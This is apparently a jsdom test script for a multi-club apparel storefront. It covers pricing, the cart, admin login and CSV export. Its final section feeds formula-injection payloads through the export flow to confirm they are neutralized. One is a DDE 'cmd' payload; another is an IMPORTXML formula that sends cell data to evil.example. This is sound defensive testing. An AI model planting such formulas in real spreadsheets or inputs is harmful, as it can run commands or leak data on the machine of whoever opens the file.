const { JSDOM, ResourceLoader } = require("jsdom");
const fs = require("fs");

// index.html lazily loads admin.js via a real <script src="admin.js">
// tag — a custom ResourceLoader intercepts that one
// request and serves the real file, so window.loadAdminScript() resolves
// in jsdom exactly like it would in a browser.
const adminJsSource = fs.readFileSync(__dirname + "/public/admin.js", "utf8");
class AdminResourceLoader extends ResourceLoader {
  fetch(url, options){
    if(url.includes("/admin.js")) return Promise.resolve(Buffer.from(adminJsSource, "utf-8"));
    return super.fetch(url, options);
  }
}

let libSrc = fs.readFileSync(__dirname + "/functions/_lib/hostConfig.js", "utf8")
  .replace(/export const/g, "const")
  .replace(/export function/g, "function");
let httpSrc = fs.readFileSync(__dirname + "/functions/_lib/http.js", "utf8")
  .replace(/export function/g, "function");
// getCatalogData(env) mock — org identity/product/pricing data in the
// orgs/subdomainMap shape functions/_lib/catalogCache.js provides.
global.getCatalogData = async () => ({
  subdomainMap: {
    "league101": "league-101",
    "league202": "league-202",
    "league303": "league-303",
    "club404": "club-404",
    "rec": "rec"
  },
  orgs: {
    "league-101": {
      name: "Example League 101",
      eyebrow: "Members shop",
      accent: "#1E7A4C",
      ready: true,
      desc: "Embroidered polos and a coordinating cap, in the club's colours. Pick your fabric, size, and add personalization if you'd like your name stitched on.  Click on images to see a larger image.",
      designImages: { shirt: "images/design-on-shirt.png", cap: "images/design-on-cap.png", detail: "images/design-detail.png" },
      products: [
        { productId:"A", type:"shirt", name:"Option A — Budget Performance", sub:"Style 100 · poly interlock, UPF 50 sun protection", images:["images/polo-a-front.jpg"], features:["100% polyester interlock knit","UPF 50 sun protection","Moisture-wicking, colour-fast","3-button placket"], personalizationPrice:2, pricingMode:"sized", sizePricing:{XS:23,S:23,M:23,L:23,XL:23,"2XL":24,"3XL":26,"4XL":27} },
        { productId:"B", type:"shirt", name:"Option B — Traditional", sub:"Style 200 · 65/35 poly-cotton pique, classic polo feel", images:["images/polo-b-front.jpg"], features:["65/35 poly-cotton pique knit","Classic woven collar","The look most people picture as \u201Cdress polo\u201D","3-button placket"], personalizationPrice:2, pricingMode:"sized", sizePricing:{XS:25,S:25,M:25,L:25,XL:25,"2XL":26,"3XL":28,"4XL":29} },
        { productId:"C", type:"shirt", name:"Option C — Premium Performance", sub:"Style 300 · poly micropique, softest hand of the three", images:["images/polo-c-front.jpg"], features:["Poly tricot micropique","Softest hand-feel of the three options","Snag- and wrinkle-resistant","Side vents"], personalizationPrice:2, pricingMode:"sized", sizePricing:{XS:27,S:27,M:27,L:27,XL:27,"2XL":28,"3XL":30,"4XL":31} },
        { productId:"D", type:"cap", name:"Option D — Cap", sub:"Style 400 · structured mid-profile mesh cap, one size fits all", images:["images/cap-d-front.jpg","images/cap-d-back.jpg"], features:["Structured, mid-profile, pinpoint mesh","Stretch sweatband, moisture-wicking","Pre-curved bill with bendable technology","Low-profile hook-and-loop closure"], personalizationPrice:null, pricingMode:"flat", flatPrice:16 }
      ]
    },
    "league-202": { name:"Second League 202", eyebrow:"Members shop", accent:"#2E5D9B", ready:false, desc:"Catalog in progress.", designImages:{shirt:"",cap:"",detail:""}, products:[] },
    "league-303": { name:"Third League 303", eyebrow:"Members shop", accent:"#C9A84C", ready:false, desc:"Catalog in progress.", designImages:{shirt:"",cap:"",detail:""}, products:[] },
    "club-404": { name:"Example Club 404", eyebrow:"Youth group", accent:"#4A5D23", ready:false, desc:"Catalog in progress.", designImages:{shirt:"",cap:"",detail:""}, products:[] },
    "rec": {
      name:"Example Crew Co", eyebrow:"Work crew shop", accent:"#F6921E", ready:true,
      desc:"Sun-protection hoodies for the crew, sold as a 6-pack or 12-pack (one size per pack). Every hoodie comes with the crew logo heat-transferred on the left chest.  Click on images to see a larger image.",
      designImages:{shirt:"",cap:"",detail:""},
      products: [
        { productId:"A", type:"shirt", name:"UPF 50+ Sun Hoodie — 12-Pack", sub:"Hooded long-sleeve sun shirt · 100% polyester, Light Blue, sold as a 12-pack (same size)", images:["images/sample-sun-shirt.jpg","images/sample-hoodie-front.jpg","images/sample-logo.png"], features:["UPF 50+ sun protection — fast-dry, breathable, stays cool","Soft 4-way-stretch fabric, relaxed fit","Built-in sun-protection hood, tag-free collar","Crew logo heat-transferred on left chest (2.75\" × 2.75\")"], personalizationPrice:null, pricingMode:"sized", sizePricing:{M:132,L:132,XL:132,"2XL":132,"3XL":132} },
        { productId:"B", type:"shirt", name:"UPF 50+ Sun Hoodie — 12-Pack (Plain Logo)", sub:"Hooded long-sleeve sun shirt · 100% polyester, Light Blue, sold as a 12-pack (same size)", images:["images/sample-sun-shirt-plain.jpg","images/sample-hoodie-front.jpg","images/sample-logo-plain.png"], features:["UPF 50+ sun protection — fast-dry, breathable, stays cool","Soft 4-way-stretch fabric, relaxed fit","Built-in sun-protection hood, tag-free collar","Crew logo heat-transferred on left chest (2.75\" × 2.75\") — plain (transparent), instead of the bordered logo box"], personalizationPrice:null, pricingMode:"sized", sizePricing:{M:132,L:132,XL:132,"2XL":132,"3XL":132} },
        { productId:"C", type:"shirt", name:"UPF 50+ Sun Hoodie — 6-Pack", sub:"Hooded long-sleeve sun shirt · 100% polyester, Light Blue, sold as a 6-pack (same size)", images:["images/sample-sun-shirt.jpg","images/sample-logo.png"], features:["UPF 50+ sun protection — fast-dry, breathable, stays cool","Soft 4-way-stretch fabric, relaxed fit","Built-in sun-protection hood, tag-free collar","Crew logo heat-transferred on left chest (2.75\" × 2.75\")"], personalizationPrice:null, pricingMode:"sized", sizePricing:{M:69,L:69,XL:69,"2XL":69,"3XL":69} },
        { productId:"D", type:"shirt", name:"UPF 50+ Sun Hoodie — 6-Pack (Plain Logo)", sub:"Hooded long-sleeve sun shirt · 100% polyester, Light Blue, sold as a 6-pack (same size)", images:["images/sample-sun-shirt-plain.jpg","images/sample-logo-plain.png"], features:["UPF 50+ sun protection — fast-dry, breathable, stays cool","Soft 4-way-stretch fabric, relaxed fit","Built-in sun-protection hood, tag-free collar","Crew logo heat-transferred on left chest (2.75\" × 2.75\") — plain (transparent), instead of the bordered logo box"], personalizationPrice:null, pricingMode:"sized", sizePricing:{M:69,L:69,XL:69,"2XL":69,"3XL":69} }
      ]
    }
  }
});

let catalogSrc = fs.readFileSync(__dirname + "/functions/api/catalog.js", "utf8")
  .replace(/import \{ classifyHost \} from ["'].*["'];\n?/, "")
  .replace(/import \{ getCatalogData \} from ["'].*["'];\n?/, "")
  .replace(/import \{ getReadyToShipByOrg[^}]*\} from ["'].*["'];\n?/, "")
  .replace(/export const CATALOGS/, "var CATALOGS")
  .replace(/import \{ jsonResponse \} from ["'].*["'];\n?/, "")
  .replace(/export async function/g, "async function");
eval(libSrc + "\n" + httpSrc + "\n" + catalogSrc);
const REAL_CATALOG_RESPONSE = onRequestGet;

const html = fs.readFileSync(__dirname + "/public/index.html", "utf8");

function makeStorageMock(){
  const store = {};
  return {
    async set(key, value, shared){ store[key] = value; return {key, value, shared}; },
    async get(key, shared){ if(!(key in store)) throw new Error("not found"); return {key, value: store[key], shared}; },
    async delete(key, shared){ delete store[key]; return {key, deleted:true, shared}; },
    async list(prefix, shared){ return {keys: Object.keys(store).filter(k=>!prefix || k.startsWith(prefix)), prefix, shared}; }
  };
}

(async () => {
  // in-memory fake order store the mock /api/orders endpoint writes to / reads from
  let fakeSheetRows = [];
  const ADMIN_PASSPHRASE = "test-passphrase";

  const dom = new JSDOM(html, {
    runScripts: "dangerously", resources: new AdminResourceLoader(),
    url: "https://league101.example.com/x.html", pretendToBeVisual:true,
    beforeParse(win){
      win.storage = makeStorageMock();
      const FAKE_SESSION_TOKEN = "cookie"; // the real session is an HttpOnly cookie; admin.js only ever holds this marker
      win.fetch = async (url, opts) => {
        if(url.startsWith("/api/catalog")){
          const res = await REAL_CATALOG_RESPONSE({ request: { url: win.location.origin + url }, env: { STRIPE_SECRET_KEY: "sk_test_fake" } });
          return { ok: true, json: async () => JSON.parse(await res.text()), text: async () => (await res.text()) };
        }
        if(url.startsWith("/api/admin-session")){
          const body = JSON.parse(opts.body);
          if(body.key !== ADMIN_PASSPHRASE) return { ok: true, json: async () => ({status:"error", message:"Unauthorized"}) };
          return { ok: true, json: async () => ({status:"ok", session: "cookie", expires:"2099-01-01T00:00:00Z"}) };
        }
        // /api/orders
        const body = JSON.parse(opts.body);
        if(body.action === "listOrgs"){
          if(body.key !== FAKE_SESSION_TOKEN){
            return { ok: true, json: async () => ({status:"error", message:"Unauthorized"}) };
          }
          return { ok: true, json: async () => ({status:"ok", orgs: [{orgId:"league-101",name:"Example League 101"},{orgId:"rec",name:"Example Crew Co"}]}) };
        }
        if(body.action === "getOrders"){
          if(body.key !== FAKE_SESSION_TOKEN){
            return { ok: true, json: async () => ({status:"error", message:"Unauthorized"}) };
          }
          const grouped = {};
          fakeSheetRows.filter(r => r.orgId === body.org).forEach(r => {
            if(!grouped[r.orderId]){
              grouped[r.orderId] = {
                orderId:r.orderId, orgId:r.orgId, customerName:r.customerName,
                contact:r.contact, placedAt:r.placedAt, total:r.total, paid:r.paid, items:[]
              };
            }
            grouped[r.orderId].items.push(r.item);
          });
          return { ok: true, json: async () => Object.values(grouped) };
        }
        const order = body;
        order.items.forEach(it => {
          fakeSheetRows.push({
            orgId: order.orgId, orderId: order.orderId, customerName: order.customerName,
            contact: order.contact, placedAt: order.placedAt, total: order.total, paid: order.paid,
            item: it
          });
        });
        return { ok: true, json: async () => ({status:"ok"}) };
      };
    }
  });
  const { window } = dom;
  await new Promise(r=>setTimeout(r,100));

  console.log("=== Personalization pricing test ===");
  const persCheck = window.document.getElementById("pers-A");
  persCheck.checked = true;
  persCheck.dispatchEvent(new window.Event("change", {bubbles:true}));
  const persNameField = window.document.getElementById("pers-name-A");
  console.log("Name field visible after check:", persNameField.style.display === "block");
  persNameField.value = "Aaron";
  window.document.getElementById("size-A").value = "M"; // $23 base
  window.document.getElementById("qty-A").value = "2";
  window.addToCart("A"); // expect (23+2)*2 = 50
  await new Promise(r=>setTimeout(r,20));
  const cart = window.eval("cart");
  console.log("Cart line:", JSON.stringify(cart[0]));
  console.log("Expected lineTotal 50, got:", cart[0].lineTotal, cart[0].lineTotal===50 ? "PASS":"FAIL");

  console.log("\n=== Remove from cart test ===");
  window.removeFromCart(0, "league-101");
  await new Promise(r=>setTimeout(r,20));
  console.log("Cart length after remove (expect 0):", window.eval("cart").length);

  console.log("\n=== CSV export test ===");
  // re-add and place an order first
  window.document.getElementById("size-B").value = "2XL";
  window.document.getElementById("qty-B").value = "1";
  window.addToCart("B"); // $26
  await new Promise(r=>setTimeout(r,20));
  window.document.getElementById("custName").value = "Test Buyer";
  window.document.getElementById("custContact").value = "testbuyer@example.com";
  const pmSel2a = window.document.getElementById("custPaymentMethod");
  if(pmSel2a) pmSel2a.value = "Zelle";
  await window.placeOrder("league-101");
  await new Promise(r=>setTimeout(r,50));

  await window.loadAdminScript(); // admin.js is lazily loaded
  window.renderAdminPicker(window.document.getElementById("app"));
  // Overlay is already in the DOM by now (see test.js for why) — fill it
  // in and submit like a real user would. adminKey persists for the
  // rest of this window's lifetime, so
  // the later selectAdminOrg() calls below never need to re-submit.
  window.document.getElementById("adminPassInput").value = ADMIN_PASSPHRASE;
  window.document.querySelector(".admin-pass-submit").click();
  await new Promise(r=>setTimeout(r,150));
  window.selectAdminOrg("league-101");
  await new Promise(r=>setTimeout(r,150));
  window.exportCsv("league-101");
  const box = window.document.getElementById("exportBox");
  console.log("Export box populated:", box.value.length > 0);
  console.log(box.value);

  console.log("\n=== CSV/formula injection guard on exported spreadsheet text ===");
  console.log("csvSafe leaves an ordinary name untouched:", window.csvSafe("Alex Sample") === "Alex Sample");
  console.log("csvSafe neutralizes a leading =:", window.csvSafe('=cmd|\'/c calc\'!A1') === '\'=cmd|\'/c calc\'!A1');
  console.log("csvSafe neutralizes a leading +:", window.csvSafe("+1+1").startsWith("'"));
  console.log("csvSafe neutralizes a leading -:", window.csvSafe("-1+1").startsWith("'"));
  console.log("csvSafe neutralizes a leading @:", window.csvSafe("@SUM(1,1)").startsWith("'"));

  // End-to-end: a customer name that looks like an IMPORTXML formula must
  // come out of the actual export flow already neutralized.
  window.go("org", "league-101"); // back to the storefront from the admin view
  await new Promise(r=>setTimeout(r,50));
  window.document.getElementById("size-A").value = "M";
  window.addToCart("A");
  await new Promise(r=>setTimeout(r,20));
  window.document.getElementById("custName").value = '=IMPORTXML("https://evil.example/leak?d="&A1,"//a")';
  window.document.getElementById("custContact").value = "attacker@example.com";
  const pmSel2b = window.document.getElementById("custPaymentMethod");
  if(pmSel2b) pmSel2b.value = "Zelle";
  await window.placeOrder("league-101");
  await new Promise(r=>setTimeout(r,50));

  window.selectAdminOrg("league-101");
  await new Promise(r=>setTimeout(r,150));
  window.exportCsv("league-101");
  const box2 = window.document.getElementById("exportBox");
  console.log("Exported text does NOT contain a live leading '=IMPORTXML' cell:", !box2.value.includes("\t=IMPORTXML"));
  console.log("Exported text contains the neutralized, apostrophe-prefixed version instead:", box2.value.includes("'=IMPORTXML"));
})();
